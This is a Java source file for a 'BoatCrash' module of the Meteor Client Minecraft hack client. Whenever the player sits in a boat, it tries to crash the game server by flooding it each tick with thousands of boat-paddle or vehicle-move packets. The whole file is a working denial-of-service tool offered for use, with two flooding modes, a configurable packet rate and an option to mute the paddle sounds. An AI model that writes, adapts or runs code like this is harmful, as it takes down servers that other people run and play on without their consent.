/*
 * This file is part of the Meteor Client distribution (https://github.com/MeteorDevelopment/meteor-client/).
 * Copyright (c) 2022 Meteor Development.
 */

package meteordevelopment.meteorclient.systems.modules.misc;

import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.PlaySoundEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.systems.modules.Categories;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.entity.Entity;
import net.minecraft.entity.vehicle.AbstractBoatEntity;
import net.minecraft.entity.vehicle.BoatEntity;
import net.minecraft.network.packet.c2s.play.BoatPaddleStateC2SPacket;
import net.minecraft.network.packet.c2s.play.VehicleMoveC2SPacket;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Vec3d;

public class BoatCrash extends Module {
    public enum Mode {
        Shit,
        New
    }

    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Mode> mode = sgGeneral.add(new EnumSetting.Builder<Mode>()
        .name("mode")
        .description("Which crash method to use.")
        .defaultValue(Mode.New)
        .build()
    );

    private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
        .name("amount")
        .description("How many packets to send to the server per tick.")
        .defaultValue(2000)
        .min(1000)
        .sliderMax(8000)
        .build()
    );

    private final Setting<Boolean> noSound = sgGeneral.add(new BoolSetting.Builder()
        .name("no-sound")
        .description("Blocks the noisy paddle sounds.")
        .defaultValue(false)
        .visible(() -> mode.get() == Mode.Shit)
        .build()
    );

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable")
        .description("Disables module on kick.")
        .defaultValue(true)
        .build()
    );

    public BoatCrash() {
        super(Categories.Misc, "boat-crash", "Tries to crash the server when you are in a boat. (By 0x150)");
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if (mc.player == null || mc.getNetworkHandler() == null) return;
        Entity boat = mc.player.getVehicle();
        if (!(boat instanceof AbstractBoatEntity)) {
            error("You must be in a boat - disabling.");
            toggle();
            return;
        }
        if (mode.get() == Mode.Shit) {
            BoatPaddleStateC2SPacket PACKET = new BoatPaddleStateC2SPacket(true, true);
            for (int i = 0; i < amount.get(); i++) {
                mc.getNetworkHandler().sendPacket(PACKET);
            }
        } else {
            Entity vehicle = mc.player.getVehicle();
            BlockPos start = mc.player.getBlockPos();
            Vec3d end = new Vec3d(start.getX() + .5, start.getY() + 1, start.getZ() + .5);
            vehicle.updatePosition(end.x, end.y - 1, end.z);
            VehicleMoveC2SPacket PACKET2 = VehicleMoveC2SPacket.fromVehicle(vehicle);
            for (int i = 0; i < amount.get(); i++) {
                mc.getNetworkHandler().sendPacket(PACKET2);
            }
        }
    }

    @EventHandler
    private void onPlaySound(PlaySoundEvent event) {
        if (noSound.get() && event.sound.getId().toString().equals("minecraft:entity.boat.paddle_land") || event.sound.getId().toString().equals("minecraft:entity.boat.paddle_water")) {
            event.cancel();
        }
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get()) toggle();
    }
}

